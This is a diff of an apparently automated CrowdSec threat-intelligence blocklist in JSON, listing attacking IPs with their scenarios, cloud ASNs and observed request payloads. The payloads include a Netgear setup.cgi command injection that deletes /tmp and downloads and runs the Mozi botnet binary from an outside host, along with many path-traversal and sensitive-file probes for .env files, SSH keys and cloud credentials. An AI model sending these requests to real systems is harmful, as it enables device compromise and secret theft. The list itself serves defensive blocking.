@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-26T13:00:00Z",
+  "generated_at": "2026-10-27T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 44,
-    "v4": 44,
+    "total": 43,
+    "v4": 43,
     "v6": 0
   },
   "items": [
@@ -28,190 +28,6 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "34.19.161.145",
-      "family": "v4",
-      "first_seen": "2026-10-19T17:00:00Z",
-      "last_seen": "2026-10-19T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.19.128.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /.ssh/authorized_keys",
-        "GET /etc/.env",
-        "GET /.env.live",
-        "GET /.env.development?raw",
-        "GET /api/orders/..%2F..%2F.env",
-        "GET /.env",
-        "GET /api/data/..%2F..%2F.env",
-        "GET /packages/.env",
-        "GET /",
-        "GET /robots.txt",
-        "GET /vb4vabszi5tsjfkt1xzl",
-        "POST /",
-        "GET /[REDACTED_DOMAIN]",
-        "GET /klztddneztoo2cy7ub0a",
-        "GET /.env.production?raw",
-        "GET /@fs/.env?raw??",
-        "GET /.env.production::$DATA?raw",
-        "GET /@fs/root/.env?raw??",
-        "POST /graphql",
-        "GET /.env.local?.svg?.wasm?init"
-      ]
-    },
-    {
-      "ip": "34.24.239.16",
-      "family": "v4",
-      "first_seen": "2026-10-19T15:00:00Z",
-      "last_seen": "2026-10-19T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.24.0.0/16",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /admin/.env",
-        "GET /.env.supabase",
-        "GET /api/fs/read?allowOutsideWorkspace=true&path=/app/.env",
-        "GET /.env.bak",
-        "GET /.env.old",
-        "GET /.env.save",
-        "GET /.dockerenv",
-        "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../.env",
-        "GET /static../.env",
-        "GET /files../.env",
-        "GET /images../.env",
-        "GET /.env",
-        "GET /..%2F.env",
-        "GET /dashboard%2F.env",
-        "GET /",
-        "GET /robots.txt",
-        "GET /[REDACTED_DOMAIN]",
-        "GET /p69w9bda38ok6gx5p80p",
-        "GET /pzkx3flg4jvs71qaezha",
-        "POST /graphql"
-      ]
-    },
-    {
-      "ip": "34.187.31.226",
-      "family": "v4",
-      "first_seen": "2026-10-19T13:00:00Z",
-      "last_seen": "2026-10-19T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.187.0.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /.s3cfg",
-        "GET /.ssh/id_rsa",
-        "GET /.cache/huggingface/token",
-        "GET /id_dsa",
-        "GET /privatekey.key",
-        "GET /localhost.key",
-        "GET /.amplifyrc",
-        "GET /",
-        "GET /robots.txt",
-        "GET /qqa1eqai1trbrnhpjus9",
-        "GET /[REDACTED_DOMAIN]",
-        "GET /9wqy7ke2uxvqcpdyym29",
-        "GET /serviceAccountKey.json",
-        "GET /firebase-adminsdk.json",
-        "GET /compose.yaml",
-        "GET /terraform.tfstate",
-        "GET /credentials.json",
-        "POST /graphql",
-        "GET /docker-compose.yaml",
-        "GET /docker-compose.yml"
-      ]
-    },
-    {
-      "ip": "34.187.88.97",
-      "family": "v4",
-      "first_seen": "2026-10-19T15:00:00Z",
-      "last_seen": "2026-10-19T21:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.187.0.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /.env.config",
-        "GET /.env.preprod",
-        "GET /.config/gcloud/credentials.db",
-        "GET /.env.staging.local",
-        "GET /.my.cnf",
-        "GET /.ssh/config",
-        "GET /.ssh/id_ed25519",
-        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
-        "GET /supabase/config.toml",
-        "GET /",
-        "GET /robots.txt",
-        "GET /mu5mz80evx05wnkpfmb1",
-        "GET /4ufkwt9mjoquprfm3y5o",
-        "GET /.npmrc",
-        "GET /compose.yml",
-        "GET /terraform.tfstate",
-        "GET /compose.yaml",
-        "GET /docker-compose.yaml",
-        "POST /graphql",
-        "GET /.env.supabase"
       ]
     },
     {
@@ -1363,6 +1179,116 @@
       ],
       "payloads": [
         "GET /manager/html"
+      ]
+    },
+    {
+      "ip": "34.80.116.203",
+      "family": "v4",
+      "first_seen": "2026-10-26T19:00:00Z",
+      "last_seen": "2026-10-26T22:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.80.112.0/20",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /.dockerenv",
+        "GET /gcp-key.json",
+        "GET /.gitlab-ci.yml",
+        "GET /userfiles/x?path=../../.env",
+        "GET /sa.json",
+        "GET /public../.env",
+        "GET /build../.env",
+        "GET /dist../.env",
+        "GET /files../.env",
+        "GET /api/..;/.env",
+        "GET /secrets.yml",
+        "GET /",
+        "GET /robots.txt",
+        "GET /sitemap.xml",
+        "GET /sitemap_index.xml",
+        "GET /5x7w2nba2nswrushh2qf",
+        "GET /juu36bniaupo7b48s1aw",
+        "GET /[REDACTED_DOMAIN]",
+        "GET /credentials.json",
+        "POST /graphql"
+      ]
+    },
+    {
+      "ip": "172.180.64.72",
+      "family": "v4",
+      "first_seen": "2026-10-26T21:00:00Z",
+      "last_seen": "2026-10-26T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /owa/auth/x.js"
+      ]
+    },
+    {
+      "ip": "34.74.130.248",
+      "family": "v4",
+      "first_seen": "2026-10-26T13:00:00Z",
+      "last_seen": "2026-10-26T13:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.74.128.0/20",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /.bashrc",
+        "GET /.env.keys",
+        "GET /.env.dev.local",
+        "GET /.firebaserc",
+        "GET /.env.credentials",
+        "GET /.env.secret",
+        "GET /.env.preprod",
+        "GET /",
+        "GET /robots.txt",
+        "GET /sitemap.xml",
+        "GET /sitemap_index.xml",
+        "GET /tyc7lwaopn1zj4a8l2pp",
+        "POST /_next",
+        "GET /.gitlab-ci.yml",
+        "GET /docker-compose.yaml",
+        "GET /service_account.json",
+        "GET /a89fjma2u6zqs64nteed",
+        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
+        "POST /graphql",
+        "GET /firebase-service-account.json"
       ]
     }
   ]
